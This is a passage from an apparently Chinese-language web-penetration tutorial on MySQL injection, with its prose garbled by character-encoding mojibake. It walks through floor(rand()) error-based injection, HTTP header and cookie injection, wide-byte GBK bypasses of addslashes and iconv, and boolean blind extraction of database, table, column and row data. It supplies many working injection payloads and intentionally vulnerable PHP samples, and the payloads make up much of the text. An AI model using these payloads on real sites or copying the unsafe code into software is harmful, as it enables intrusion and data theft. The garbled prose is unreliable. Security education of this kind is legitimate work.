</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409153457-1692246647204-28.png"><p>MySQLæ‰§è¡Œè¯¥è¯­å¥æ—¶<span style="background:#b1ffff">é¦–å…ˆä¼šå»ºç«‹ä¸€ä¸ªè™šè¡¨</span>ï¼ˆè¯¥è™šè¡¨æœ‰ä¸¤ä¸ªå­—æ®µç»„æˆï¼Œä¸€ä¸ªæ˜¯åˆ†ç»„çš„keyï¼Œä¸€ä¸ªæ˜¯è®¡æ•°å€¼count(*)ï¼‰ï¼Œgroup byè¿›è¡Œåˆ†ç»„æ—¶ï¼Œfloor(rand(0)*2)ä¼šå¤šæ‰§è¡Œä¸€æ¬¡ï¼Œè§¦å‘æ‰§è¡Œä¸€æ¬¡çš„æ¡ä»¶ä¸ºï¼Œè™šè¡¨ä¸å­˜åœ¨è¯¥åˆ†ç»„ï¼Œé‚£ä¹ˆåœ¨æ’å…¥æ–°åˆ†ç»„çš„æ—¶å€™floor(rand(0)*2)å°±è®¡ç®—äº†ä¸€æ¬¡ï¼Œæ ¹æ®floor(rand(0)*2)çš„ç¡®å®šæ€§ï¼ˆ011011çš„é¡ºåºï¼‰æ¥è¿›è¡Œæ’å…¥</p><blockquote><p>011011011â€¦â€¦â€¦â€¦</p></blockquote><ol><li>é¦–å…ˆé‡åˆ°ç¬¬ä¸€ä¸ªå€¼â€0â€ï¼Œå‘ç°â€0â€ä¸åœ¨è™šè¡¨ä¸­ï¼Œåˆ™éœ€è¦æ’å…¥åˆ†ç»„ï¼Œæ­¤æ—¶floor(rand(0)*2)ä¼šè®¡ç®—ä¸€æ¬¡ï¼Œä»è€Œå˜æˆç¬¬äºŒä¸ªå€¼â€1â€ï¼Œå³ç¬¬ä¸€ä¸ªæ’å…¥keyçš„å€¼ç”±0å˜æˆäº†ç¬¬äºŒä¸ªå€¼1</li><li>æŸ¥çœ‹ç¬¬äºŒä¸ªå€¼æ˜¯â€1â€ï¼Œå­˜åœ¨è™šè¡¨ä¸­ï¼Œcountè®¡æ•°åŠ 1</li><li>é‡åˆ°ç¬¬ä¸‰ä¸ªå€¼â€1â€ï¼Œå‘ç°â€1â€å­˜åœ¨è™šè¡¨ä¸­ï¼Œcountè®¡æ•°åŠ 1</li><li>æ­¤æ—¶è™šè¡¨ä¸­1å€¼ä¸ªæ•°ç”±1å˜ä¸º2</li><li>å½“é‡åˆ°ç¬¬å››ä¸ªå€¼â€0â€ï¼Œå‘ç°0ä¸å­˜åœ¨è™šè¡¨ä¸­ï¼Œåˆ™éœ€è¦æ’å…¥åˆ†ç»„ï¼Œæ­¤æ—¶floor(rand(0)*2)åˆä¼šè®¡ç®—ä¸€æ¬¡ï¼Œä»è€Œå˜æˆç¬¬äº”ä¸ªå€¼â€1â€</li><li>æ­¤æ—¶å¾€è™šè¡¨ä¸­æ’å…¥åˆ†ç»„1ï¼Œå‘ç°åˆ†ç»„1å­˜åœ¨äºè™šè¡¨ä¸­ï¼Œåˆ™å‘ç”ŸæŠ¥é”™</li></ol><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409153907-1692246647204-29.png"><p>åœ¨è™šè¡¨ä¸­å†™å…¥ä¸‰æ¡è®°å½•æ—¶ï¼Œäº§ç”Ÿäº†æŠ¥é”™ï¼Œæ­¤æ—¶floor(rand(0)*2)ä¸€å…±è¢«è®¡ç®—äº†5æ¬¡ï¼Œè¿™ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆæ•°æ®è¡¨æœ€å°‘æœ‰3æ¡æ•°æ®æ‰ä¼šæŠ¥é”™</p><pre><code class="sql">?id=1 union select (select 1 from(select count(*),concat((è¦æ‰§è¡Œçš„SQLè¯­å¥),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a);

?id=1 union select (select 1 from(select count(*),concat((select concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a);
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409154301-1692246647204-30.png"><h1 id="Headæ³¨å…¥"><a href="#Headæ³¨å…¥" class="headerlink" title="Headæ³¨å…¥"></a>Headæ³¨å…¥</h1><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="sql">insert into ugaent (&#39;useragent&#39;, &#39;username&#39;) values ($agent, $user);
</code></pre><blockquote><p>$agentæ˜¯ç›´æ¥é€šè¿‡$_SERVER[â€˜HTTP_USER_AGENTâ€™]è·å–ï¼Œæ²¡æœ‰ä»»ä½•é˜²æŠ¤</p></blockquote><p>é€šè¿‡æŠ¥é”™è¯­å¥ â€˜ or updatexml(1,count(0x7e,(select database()),0x7e),1),1) â€“ 123ï¼ˆåé¢çš„ ,1 æ˜¯å› ä¸ºå‰é¢æ’å…¥äº†ä¸¤ä¸ªæ•°æ®ï¼Œè¿™é‡Œä¹Ÿéœ€è¦ä¸¤ä¸ªæ•°æ®æ¥ä¿æŒä¸€è‡´ï¼‰</p><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>é€šè¿‡$_SERVERè·å–çš„æ•°æ®æœªç»ä»»ä½•å¤„ç†ï¼Œç›´æ¥æ’å…¥æ•°æ®åº“ï¼Œä»è€Œå½¢æˆheadæ³¨å…¥ï¼Œè·å–æ•°æ®ä¹‹åå°±ä¼šæ’å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰å›æ˜¾ï¼Œæ˜¾é”™æ³¨å…¥æ— æ•ˆï¼Œåªèƒ½ç›²æ³¨æˆ–å»¶æ—¶æ³¨å…¥ï¼ˆå¦‚æœå­˜åœ¨æŠ¥é”™ä¿¡æ¯ä¹Ÿå¯ä»¥å°è¯•æŠ¥é”™æ³¨å…¥ï¼‰</p><p><strong>cookie</strong></p><pre><code class="php">$_COOKIE[&#39;id&#39;] // è·å–ç”¨æˆ·çš„cookieä¿¡æ¯ï¼Œæ— ä»»ä½•è¿‡æ»¤
</code></pre><p><strong>user_agent</strong></p><pre><code class="php">$_SERVER[&#39;HTTP_USER_ADENT&#39;] // è·å–ç”¨æˆ·ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·æµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯
</code></pre><p><strong>referer</strong></p><pre><code class="php">$_SERVER[&#39;HTTP_REFERER&#39;] // è·å–refererè¯·æ±‚å¤´æ•°æ®
</code></pre><p><strong>x-forwarded-for</strong></p><pre><code class="php">$_SERVER[&#39;X_FORWARDED_FOR&#39;] // è·å–æµè§ˆç½‘é¡µçš„ç”¨æˆ·ID
</code></pre><p><strong>host</strong></p><pre><code class="php">$_SERVER[&#39;HTTP_HOST&#39;] // è¯·æ±‚å¤´ä¿¡æ¯ä¸­çš„hostå†…å®¹ï¼Œè·å–å½“å‰åŸŸå
</code></pre><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="php">&lt;?php
    $con = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;) or die(&#39;bad!&#39;);
    mysql_select_db(&#39;test&#39;, $con) or emMsg(&quot;æ•°æ®åº“è¿æ¥å¤±è´¥&quot;);
    mysql_query(&quot;set names &#39;gbk&#39;&quot; . $con);
    $id = addslashes($_GET[&#39;id&#39;]);
    $sql = &quot;select * from users where id = &#39;$id&#39; limit 0,1&quot;;
    $result = mysqli_query($sql, $con) or die(mysql_error());
    $row = mysqli_fetch_array($result);
    if($row)&#123;
        echo $row[&#39;username&#39;] . &quot;:&quot; . $row[&#39;address&#39;];
    &#125;else&#123;
        print_r(myqsl_error());
    &#125;
?&gt;
&lt;?php
    echo &quot;&lt;br&gt; The Query String is &quot; .  $sql . &quot;&lt;br&gt;&quot;;
?&gt;
</code></pre><p>é­”æœ¯å¼•å· : <mark style="background:#FF5582A6">magc_quotes_gpc</mark></p><p><span style="background:#b1ffff">addslashes()</span> å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æäº¤è¿‡çš„æ•°æ®ï¼ˆgetã€postã€cookieä¼ é€’çš„æ•°æ®ï¼‰ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLå­—ç¬¦ï¼‰å°±ä¼šåœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªåæ–œæ  \</p><h2 id="ç¼–ç ä»‹ç»"><a href="#ç¼–ç ä»‹ç»" class="headerlink" title="ç¼–ç ä»‹ç»"></a>ç¼–ç ä»‹ç»</h2><p><strong>asciiã€gbkå’Œutf-8ç¼–ç </strong></p><ol><li>ascii : ä¸€ä¸ªå­—èŠ‚</li><li>gbk : ä¸¤ä¸ªå­—èŠ‚</li><li>utf-8 : ä¸‰ä¸ªå­—èŠ‚</li></ol><p>gbkç¼–ç ï¼ˆåŒå­—èŠ‚ç¼–ç ï¼‰ : ä¸€ä¸ªæ±‰å­—ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºï¼ˆé¦–å­—èŠ‚å¯¹åº”0x81-0xFEã€å°¾å­—èŠ‚å¯¹åº”0x40-0xFFã€è½¬ç§»å­—ç¬¦ä¸º0x5cï¼‰</p><pre><code class="php">%df%27  ==&gt;  (addslashes) ==&gt; %df%5c%27 ==&gt; (æ•°æ®åº“GBK)   ==&gt; é‹&#39;
ç”¨æˆ·è¾“å…¥ ==&gt;     è¿‡æ»¤å‡½æ•°    ==&gt; ä»£ç å±‚$sql ==&gt; mysqlå¤„ç†è¯·æ±‚ ==&gt; MySQLä¸­çš„SQL
</code></pre><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å¦‚æœè¯´PHPçš„ç¼–ç ä¸º UTF-8 è€Œ MySQL çš„ç¼–ç è®¾ç½®ä¸º <code>SET NAMES &#39;gbk&#39;</code> æˆ–è€… <code>SET character_set_client=gbk</code></p><p>è¿™æ ·é…ç½®ä¼šå¼•èµ·ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚</p><p>è¿™é‡Œè¦è¯´æ˜ä¸€å°ç‚¹çš„æ˜¯ <code>SET NAMES &#39;x&#39;</code>è¯­å¥ä¸è¿™ä¸‰ä¸ªè¯­å¥ç­‰ä»·</p><pre><code class="sql">mysql&gt;SET character_set_client =x;
mysql&gt;SET character_set_results =x;
mysql&gt;SET character_set_connection =x;
</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ä½ è®¾ç½®äº†<code>SET NAMES &#39;x&#39;</code>æ—¶å°±ç­‰äºåŒæ—¶æ‰§è¡Œäº†ä¸Šé¢çš„3æ¡è¯­å¥ï¼Œæˆ‘ç†è§£çš„å®½å­—èŠ‚æ³¨å…¥å°±æ˜¯phpå‘é€è¯·æ±‚åˆ°MySQLæ—¶ä½¿ç”¨äº†è¯­å¥ï¼Œ<code>SET NAMES &#39;gbk&#39;</code>æˆ–è€…<code>SET character_set_client =gbk</code>,è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œä½†æ˜¯åˆç”±äºä¸€äº›ä¸ç»æ„çš„å­—ç¬¦é›†è½¬æ¢å¯¼è‡´äº†å®½å­—èŠ‚çš„æ³¨å…¥ã€‚</p><p>æ ¹æœ¬åŸå›  ï¼š<span style="background:#b1ffff">character_set_clientï¼ˆå®¢æˆ·ç«¯å­—ç¬¦é›†ï¼‰å’Œ character_set_connectionï¼ˆè¿æ¥å±‚çš„å­—ç¬¦é›†ï¼‰ä¸åŒ</span>ï¼Œæˆ–è½¬æ¢å‡½æ•°å¦‚ <span style="background:#b1ffff">iconv,mb_convert_encoding ä½¿ç”¨ä¸å½“</span></p><h2 id="GETä¼ å‚"><a href="#GETä¼ å‚" class="headerlink" title="GETä¼ å‚"></a>GETä¼ å‚</h2><p>å½“ç‰¹æ®Šå­—ç¬¦è¢«åæ–œæ è½¬ä¹‰æ—¶ï¼Œåœ¨é—­åˆçš„å‰æ–¹åŠ ä¸Šä¸€ä¸ªå­—ç¬¦ï¼Œè®©è¿™ä¸ªå­—ç¬¦å’Œåæ–œæ è½¬æˆä¸€ä¸ªæ–°çš„gbkç¼–ç çš„æ±‰å­—</p><pre><code class="sql">?id=1 %aa&#39; and 1=1 -- 123

select *from user where id=&#39;1ï¿½\&#39; and 1=1 -- 123&#39;
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®åº“</strong></p><pre><code class="sql">?id=1 %df&#39; union select 1,2,3 -- 123
?id=1 %df&#39; union select 1,user(),database() -- 123
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®è¡¨</strong></p><pre><code class="sql">?id=1 %df&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() -- 123

?id=1 %df&#39; union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 -- 123
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®å­—æ®µ</strong></p><p>è¿™é‡Œè¾“å…¥table_name&#x3D;åé¢è¦åŠ å•å¼•å·ï¼Œä¼šè¢«è½¬ä¹‰ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡</p><ol><li>å­æŸ¥è¯¢</li></ol><pre><code class="sql">?id=1 %df&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1) -- 123

?id=1 %df&#39; union select 1,2,column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1) limit 0,1 -- 123
</code></pre><ol start="2"><li>16è¿›åˆ¶ç¼–ç </li></ol><pre><code class="sql">?id=1 %df&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=16è¿›åˆ¶çš„è¡¨å(ä¾‹å¦‚ : user : 0x75736572) -- 123

?id=1 %df&#39; union select 1,2,column_name from information_schema.columns where table_name=16è¿›åˆ¶çš„è¡¨å(ä¾‹å¦‚ : user : 0x75736572) limit 0,1 -- 123
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®</strong></p><pre><code class="sql">?id=1 %df&#39; union select 1,2,group_concat(å­—æ®µå) from è¡¨å -- 123

?id=1 %df&#39; union select 1,2,å­—æ®µå from è¡¨å limit 0,1 -- 123
</code></pre><h2 id="POSTä¼ å‚"><a href="#POSTä¼ å‚" class="headerlink" title="POSTä¼ å‚"></a>POSTä¼ å‚</h2><ol><li>ä½¿ç”¨burpä¿®æ”¹hexå€¼</li></ol><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409160944.png"><ol start="2"><li>åˆ©ç”¨utf-8çš„ç‰¹æ€§ï¼ŒåŠ ä¸Šåæ–œæ ç»„åˆæˆä¸¤ä¸ªgbkæ ¼å¼çš„æ±‰å­—</li></ol><blockquote><p>ä½ â€™) or 1&#x3D;1 #</p></blockquote><p>æ³¨å…¥æ–¹å¼å’ŒGETæ–¹å¼ç”¨äºï¼Œåªéœ€è¦å°†%dfæ›¿æ¢æˆæ±‰å­—æˆ–è€…æŠ“åŒ…ä¿®æ”¹å…¶hexå€¼</p><p><strong>ä¸¤è€…åŒºåˆ«</strong></p><ol><li>GETæ˜¯é€šè¿‡ä¸€ä¸ªå­—ç¬¦åŠ ä¸Šå¦ä¸€ä¸ªå­—ç¬¦ç»„åˆæˆä¸€ä¸ªgbkæ ¼å¼çš„æ±‰å­—</li><li>POSTæ˜¯é€šè¿‡ä¸€ä¸ªæ±‰å­—åŠ ä¸Šå¦ä¸€ä¸ªå­—ç¬¦ç»„åˆæˆä¸¤ä¸ªgbkæ ¼å¼çš„æ±‰å­—ï¼Œå› ä¸ºPOSTä¸ä¼šurlç¼–ç ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æŠ“åŒ…ä¿®æ”¹hexå€¼</li></ol><h2 id="iconè½¬æ¢"><a href="#iconè½¬æ¢" class="headerlink" title="iconè½¬æ¢"></a>iconè½¬æ¢</h2><p>ä¸ºäº†é¿å…æ¼æ´ï¼Œç½‘ç«™ä¸€èˆ¬ä¼šè®¾ç½®utf-8ç¼–ç ï¼Œç„¶åè¿›è¡Œè½¬ä¹‰è¿‡æ»¤ï¼Œä½†æ˜¯ç”±äºä¸€äº›ä¸ç»æ„çš„å­—ç¬¦é›†è½¬æ¢ï¼Œä¼˜æƒ å¯¼è‡´æ¼æ´</p><p>ä½¿ç”¨ <mark style="background:#FF5582A6">set name UTF-8</mark> æŒ‡å®šutf-8å­—ç¬¦é›†ï¼Œå¹¶ä¸”ä¹Ÿä½¿ç”¨è½¬ä¹‰å‡½æ•°è¿›è¡Œè½¬ä¹‰ï¼Œæœ‰æ—¶å€™ï¼Œä¸ºäº†é¿å…ä¹±ç ï¼Œä¼šå°†ä¸€äº›ç”¨æˆ·æäº¤çš„GBKå­—ç¬¦ä½¿ç”¨ iconv() å‡½æ•°å…ˆè½¬ä¸ºUTF-8ï¼Œç„¶åå†æ‹¼æ¥SQLè¯­å¥</p><pre><code class="sql">?id=1%e5%5c%27 and 1=1 --+
</code></pre><p><span style="background:#b1ffff">%e5%5c</span> æ˜¯ gbk ç¼–ç ï¼Œè½¬æ¢ä¸º UTF-8 ç¼–ç æ˜¯ <span style="background:#b1ffff">%e9%8c%a6</span></p><p>%e5%5c%27 é¦–å…ˆä» gbk ç¼–ç ç»è¿‡ addslashes å‡½æ•°ä¹‹åå˜æˆ %e5%5c%5c%5c%27ï¼Œå†é€šè¿‡ iconv()å°†å…¶è½¬æ¢ä¸º UTF-8 ç¼–ç ï¼Œ%e9%8c%a6%5c%5c%27 ï¼Œå…¶ä¸­ %e9%8c%a6 æ˜¯æ±‰å­—ï¼Œ%5c%5c%27 è§£ç ä¹‹åæ˜¯ \â€˜ ç¬¬ä¸€ä¸ª\å°†ç¬¬äºŒä¸ª\è½¬ä¹‰ï¼Œä½¿å¾— %27 å•å¼•å·é€ƒé€¸ï¼ŒæˆåŠŸé—­åˆè¯­å¥</p><h1 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h1><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="php">&lt;?php
    $con = sqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;test&quot;);
    if(mysqli_connect_errno())&#123;
        echo &quot;è¿æ¥å¤±è´¥&quot; . mysqli_connect_errno();
    &#125;
    $id = $_GET[&#39;id&#39;];
    if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id))&#123;
        exit(&quot;no&quot;);
    &#125;
    $result = mysqli_query($con, &quot;select * from users where &#39;id&#39; =&#39;&quot; . $id . &quot;&#39;&quot;);
    $row = mysqli_fetch_arrray($result);
    if ($row)&#123;
        echo &quot;yes&quot;;
    &#125;else&#123;
        echo &quot;no&quot;;
    &#125;
?&gt;
</code></pre><blockquote><p>å½“è®¿é—® id&#x3D;1â€™ and 1&#x3D;1 â€“ 123 æ—¶ï¼Œæ•°æ®åº“æ‰§è¡Œè¯­å¥ä¸º select * from users where â€˜idâ€™&#x3D;â€™1â€™ or 1&#x3D;1 â€“ 123â€™<br>ç”±äº1 and 1&#x3D;1æ˜¯çœŸï¼Œæ‰€ä»¥è¿”å›yes</p><p>å½“è®¿é—®id&#x3D;1â€™ and 1&#x3D;2 â€“ 123 æ—¶ï¼Œæ•°æ®åº“æ‰§è¡Œè¯­å¥ä¸º select * from users where â€˜idâ€™&#x3D;â€™1â€™ or 1&#x3D;2 â€“ 123â€™<br>ç”±äº1 and 1&#x3D;2æ˜¯å‡ï¼Œæ‰€ä»¥è¿”å›no</p></blockquote><p>å¸ƒå°”ç›²æ³¨ç»“æœæ˜¯Trueå’ŒFalseï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªä¼šæ ¹æ®ä½ çš„æ³¨å…¥ä¿¡æ¯è¿”å›Trueå’ŒFalseï¼Œæ²¡æœ‰äº†ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯</p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>length()</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td>left(a,b)</td><td>ä»å·¦ä¾§æˆªå–açš„å‰bä½</td></tr><tr><td>right(a,b)</td><td>ä»å³ä¾§æˆªå–açš„å‰bä½</td></tr><tr><td>mid(str,pos,len)</td><td>ä»posä½æˆªå–strçš„lené•¿åº¦</td></tr><tr><td>substr(str,pos,len)</td><td>ä»posä½æˆªå–strçš„lené•¿åº¦</td></tr><tr><td>substring(str,pos,len)</td><td>ä»posä½æˆªå–strçš„lené•¿åº¦</td></tr><tr><td>substring_index(strï¼Œå…³é”®å­—ï¼Œå‡ºç°çš„æ¬¡æ•°)</td><td>æŒ‰å…³é”®å­—è¿›è¡Œæˆªå–(å…³é”®å­—ä¸å­˜åœ¨ï¼Œè¿”å›åŸæœ‰å­—ç¬¦ä¸²ï¼Œç”¨äºand substring_index(database(),â€™qwasdaâ€™,1)&#x3D;database())</td></tr><tr><td>count()</td><td>æŸ¥çœ‹æ•°æ®çš„ä¸ªæ•°</td></tr><tr><td>ascii()</td><td>è¿”å›æ•°æ®çš„asciiä½</td></tr></tbody></table><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409213752.png"><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>åº“åé•¿åº¦</p><pre><code class="sql">?id = 1 and length(database()) = 12
</code></pre><p>æ•°æ®åº“å</p><ul><li>é€šè¿‡left() ã€right()</li></ul><pre><code class="sql">?id=1 and left(database(),1) = &#39;k&#39;
?id=1 and left(database(),2) = &#39;ka&#39;
â€¦â€¦â€¦â€¦
?id=1 and left(database(),12) = &#39;kanwolongxia&#39;
</code></pre><ul><li>é€šè¿‡sub() + ascii()</li></ul><pre><code class="sql">?id=1 and ascii(substr(database(),1,1))&gt;1
?id=1 and ascii(substr(database(),2,1))&gt;1
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr(database(),12,1))&gt;1
</code></pre><h2 id="æ•°æ®è¡¨"><a href="#æ•°æ®è¡¨" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h2><p>æ•°æ®è¡¨ä¸ªæ•°</p><pre><code class="sql">?id=1 and (select count(table_name) from information_schema.tables where table_schema=database())&gt;1
</code></pre><p>å½“å‰æ•°æ®è¡¨é•¿åº¦</p><p>æ”¹å˜å­æŸ¥è¯¢ä¸­çš„ limit m,n ä¸­çš„må³å¯æŸ¥è¯¢å…¶ä»–æ•°æ®è¡¨é•¿åº¦</p><pre><code class="sql">?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit n,1))&gt;1
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409215354.png"><p>æ•°æ®è¡¨å</p><p>æ”¹å˜substr(str,m,n)ä¸­çš„må‚æ•°ï¼Œå³å¯æŸ¥è¯¢å¯¹åº”ä½ç½®çš„å­—ç¬¦ï¼Œæƒ³è¦æŸ¥è¯¢å…¶ä»–æ•°æ®è¡¨ï¼Œæ”¹å˜å­æŸ¥è¯¢ä¸­çš„limitå³å¯</p><pre><code class="sql">?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
</code></pre><ul><li>æŸ¥è¯¢æˆåŠŸä¼šè¿”å›1ï¼Œä¸æˆåŠŸè¿”å›0</li></ul><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409215849.png"><h2 id="æ•°æ®å­—æ®µ"><a href="#æ•°æ®å­—æ®µ" class="headerlink" title="æ•°æ®å­—æ®µ"></a>æ•°æ®å­—æ®µ</h2><p>å­—æ®µåä¸ªæ•°</p><pre><code class="sql">?id=1 and (select count(column_name) from information_schema.columns where table_name=&#39;ç¬¬1ä¸ªè¡¨å&#39;) = ä¸ªæ•°

?id=1 and (select count(column_name) from information_schema.columns where table_name=&#39;ç¬¬Nä¸ªè¡¨å&#39;) = ä¸ªæ•°
</code></pre><p>å­—æ®µåé•¿åº¦</p><p>mè¡¨ç¤ºç¬¬å‡ ä¸ªå­—æ®µå (ä»0å¼€å§‹)</p><pre><code class="sql">?id=1 and length((select column_name from information_schema.columns where table_name=&#39;ç¬¬ä¸€ä¸ªè¡¨å&#39; limit m,1)) = é•¿åº¦

?id=1 and length((select column_name from information_schema.columns where table_name=&#39;ç¬¬Nä¸ªè¡¨å&#39; limit m,1)) = é•¿åº¦
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409220526.png"><h2 id="æ•°æ®"><a href="#æ•°æ®" class="headerlink" title="æ•°æ®"></a>æ•°æ®</h2><p>æ•°æ®ä¸ªæ•°</p><pre><code class="sql">?id=1 and (select count(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨) = ä¸ªæ•°
?id=1 and (select count(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨) = ä¸ªæ•°

?id=1 and (select count(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨) = ä¸ªæ•°
?id=1 and (select count(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨) = ä¸ªæ•°
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409220828.png"><p>æ•°æ®é•¿åº¦</p><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and (select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1) = é•¿åº¦
?id=1 and (select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit N,1) = é•¿åº¦
</code></pre><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬äºŒä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ¡æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and (select length(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1) = é•¿åº¦
?id=1 and (select length(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit N,1) = é•¿åº¦
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and (select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 0,1) = é•¿åº¦
?id=1 and (select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit N,1) = é•¿åº¦
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and (select length(ç¬¬Nä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 0,1) = é•¿åº¦
?id=1 and (select length(ç¬¬Nä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 1,1) = é•¿åº¦
</code></pre><p>æ•°æ®</p><p>è¿™é‡Œé€šè¿‡substr()æ¥åˆ‡æ¢æŸ¥è¯¢ç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œé€šè¿‡limitæ¥åˆ‡æ¢æŸ¥è¯¢ç¬¬å‡ æ¡æ•°æ®ï¼Œåˆ‡æ¢å­—æ®µåæ¥æŸ¥è¯¢ç¬¬å‡ ä¸ªå­—æ®µï¼Œåˆ‡æ¢æ•°æ®è¡¨æ¥æŸ¥è¯¢ç¬¬å‡ ä¸ªæ•°æ®è¡¨</p><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
--------------------------------------------------------------------------------------
